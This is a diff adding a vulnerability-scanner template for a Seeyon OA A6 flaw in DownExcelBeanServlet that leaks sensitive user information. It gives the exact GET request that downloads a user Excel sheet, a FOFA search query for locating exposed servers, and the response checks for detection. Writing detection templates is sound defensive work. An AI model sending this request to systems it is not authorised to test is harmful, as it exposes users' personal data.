@@ -1,0 +1,24 @@
+id: seeyon-a6-downexcelbeansevlet-disclosure
+
+info:
+  name: 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露
+  author: sakura404x
+  severity: high
+  verified: true
+  description: |-
+    fofa: app="致远互联-OA"
+  tags: seeyon,disclosure
+  created: 2023/10/29
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b"[Content_Types].xml") && 
+      response.body.bcontains(b"Excel.Sheet")
+expression: r0()
